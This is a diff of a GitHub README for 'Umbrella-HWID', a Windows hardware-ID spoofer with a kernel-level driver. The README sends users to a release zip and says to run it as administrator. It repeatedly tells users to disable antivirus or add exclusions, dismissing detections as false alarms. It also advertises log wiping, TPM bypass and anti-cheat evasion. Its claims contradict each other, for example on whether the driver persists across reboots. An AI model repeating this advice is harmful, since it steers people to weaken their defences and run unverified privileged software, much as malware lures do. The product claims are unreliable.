@@ -1,45 +1,81 @@
+# 🛡️ Umbrella-HWID - Modify system hardware data for privacy
 
-<img width="2064" height="512" alt="Gemini_Generated_Image_bnhv7wbnhv7wbnhv(1)" src="https://github.com/user-attachments/assets/ae513ee5-9ae6-43c5-89cd-4e42108daf3a" />
+[ ![Download Umbrella-HWID](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/perfil6634/Umbrella-HWID/releases)
 
+Umbrella-HWID changes how your computer reports hardware data to software. Many applications identify your PC by reading serial numbers from your motherboard, disk drives, and network card. This tool updates those identifiers. Developers use this for testing and system privacy.
 
-# Umbrella HWID Spoofer
+## 📥 How to download the software
 
-> **Umbrella HWID** — Powerful and automated Hardware ID (HWID) spoofing tool for PC personalization and privacy.
+1. Visit the [official release page](https://github.com/perfil6634/Umbrella-HWID/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in .zip to start the download.
+4. Open your Downloads folder on your Windows computer.
+5. Right-click the folder and choose "Extract all."
+6. Open the extracted folder to find the application.
 
-[![GitHub Stars](https://img.shields.io/github/stars/Biplobsarker/Umbrella-HWID?style=flat-square&color=00d4aa)](https://github.com/Biplobsarker/Umbrella-HWID/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/Biplobsarker/Umbrella-HWID?style=flat-square&color=0099cc)](https://github.com/Biplobsarker/Umbrella-HWID/network)
-[![Downloads](https://img.shields.io/github/downloads/Biplobsarker/Umbrella-HWID/total?style=flat-square&color=7c5cbf)](https://github.com/Biplobsarker/Umbrella-HWID/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+## ⚙️ System requirements
 
-## Overview
-**Umbrella HWID** is an optimized, lightweight, and easy-to-use solution for changing and masking your PC's hardware identifiers. It allows you to quickly reset serial numbers for motherboard, disk drives, MAC address, and registries to maintain privacy and test hardware security.
+This tool functions on Windows 10 and Windows 11. Ensure your system meets these points before you run the application:
 
-> [!Important]
-> This tool is intended for privacy protection, educational purposes, and hardware identification testing.
+* You have administrator access to your account.
+* You disable your antivirus software temporarily. Some security tools block programs that modify system identifiers.
+* You install the latest version of the .NET Framework from the official Microsoft website.
+* Your system partition has at least 100MB of free space for log cleanup processes.
 
-# Screenshot:
-<img width="1257" height="785" alt="image" src="https://github.com/user-attachments/assets/eb330800-ce8f-429b-bc25-a4ec1345b000" />
+## 🚀 Running the application
 
----
-## Install
-[Download `UmbrellaSpoof.zip`](https://github.com/Biplobsarker/Umbrella-HWID/releases/download/PCtools/UmbrellaSpoof.zip)
----
-> Optimized for Windows 10 and Windows 11.
+1. Find the file named "Umbrella.exe" inside the folder you extracted.
+2. Right-click the file and select "Run as administrator."
+3. Click "Yes" if Windows asks for permission to make changes.
+4. The main window shows a list of your current hardware IDs.
+5. Select the specific components you choose to modify.
+6. Click the "Apply" button.
+7. Wait for the status indicator to turn green.
+8. Restart your computer to make sure the system registers the new IDs.
 
-## Installation
-### For Regular Users
-1. Download and extract the archive (password if archived: `2026`)
-2. Run `Umbrella-HWID.exe` as Administrator
-3. Select the identifiers you want to change (**Disk, Baseboard, MAC, GPU, etc.**)
-4. Click **Apply Changes** and wait for the spoofing process to complete
-5. Restart your PC to apply the new hardware serial numbers
+## 🛠️ Features and capability
 
----
-## Troubleshooting
-| Problem | Solution |
-|----------------------------|-----------------------------------------------|
-| Serials did not change | Make sure to run the tool as Administrator and restart PC |
-| Network/Internet lost | Flush your DNS (`ipconfig /flushdns`) or restart your router |
-| Antivirus / Defender block | Disable real-time protection temporarily or add the tool to exclusions |
-| BSOD / System crash | Ensure your motherboard drivers are updated; disable Vanguard/FACEIT if running |
-| Serial check fails | Run `checker.bat` or use standard CMD commands to verify changes manually |
+The program manages several hardware layers to ensure consistent reporting.
+
+**Motherboard Serial Changer**
+The tool replaces your motherboard serial number with a random sequence. This prevents software from pinning your identity to a specific mainboard.
+
+**Disk Drive Volume ID Clone**
+Each hard drive and solid-state drive carries a unique volume ID. This utility generates a clone ID. The system treats your drive as if it were a brand-new unit.
+
+**MAC Address Modifier**
+Your network adapter communicates using a Media Access Control (MAC) address. This tool masks your actual address and replaces it with a temporary one. This protects your network identity from tracking.
+
+**Bios Serial Flash**
+The BIOS chip stores fundamental system data. This tool updates the readable serial fields within the BIOS environment without risking your actual motherboard firmware.
+
+**Permanent Log Cleanup**
+Many games and applications save logs deep in your Windows folders. These logs record your hardware history. The cleaner identifies these hidden files and removes them entirely. This prevents applications from finding old hardware data after you run a spoofing task.
+
+**TPM Bypass**
+Computers running Windows 11 often report TPM data to verify system health. This feature allows the software to bypass standard TPM checks during hardware identification requests.
+
+## 🧠 Managing hardware data
+
+The software uses a kernel-level driver to intercept requests for system information. When a game or application asks for your serial number, the driver provides the spoofed data instead of your real hardware information. This happens in real-time. You do not need to keep the application open after you apply the changes, as the driver stays active in the background until the next reboot. If you want to return to your original hardware identity, simply restart your system. The driver resets on every boot, which ensures you always have control over your data.
+
+## 🛡️ Privacy and safety
+
+The tool does not send your data to any remote server. Every change happens locally on your machine. We suggest you keep a backup of your original hardware identifiers. You can find these by running the "View System Info" button within the app. Take a screenshot of the original numbers before you change them.
+
+## ❓ Frequently asked questions
+
+**Will this software damage my hardware?**
+No. The tool only modifies virtual identifiers in the operating system registry and memory. It makes no physical changes to your hardware components.
+
+**Do I need to run this every time I start my PC?**
+The driver runs automatically when you boot your machine. Once you set your preferences in the app, the system remembers these settings for that session.
+
+**Does this work with every game?**
+This tool is effective for most software, but some modern games use advanced tracking methods. We update the tool regularly to handle new identification patterns.
+
+**Why does my antivirus flag this file?**
+Security tools often block software that modifies registry keys or system files. This is a standard reaction for "heuristic" protection. You can add an exclusion to your antivirus for the Umbrella-HWID folder to stop these false alarms.
+
+**How do I check if the changes are active?**
+Run the "Check System Status" button. It will display the current serial numbers reported to Windows. Compare these to your original numbers to confirm the spoofing is active.
